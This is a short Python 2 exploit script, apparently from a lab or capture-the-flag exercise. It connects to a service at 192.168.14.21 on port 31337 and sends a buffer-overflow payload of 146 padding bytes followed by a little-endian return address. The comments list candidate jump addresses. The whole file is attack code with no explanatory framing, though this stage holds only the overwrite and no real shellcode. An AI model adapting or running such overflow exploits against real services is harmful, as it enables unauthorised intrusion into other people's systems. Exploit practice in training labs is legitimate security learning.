#!/usr/bin/python2
import sys, socket

##0x080414c3 endian it when inserting to shellcode
##0x080416bf
shellcode = "A" * 146 + "\xc3\x14\x04\x08"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.14.21',31337))
	s.send((shellcode + '\r\n'))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()
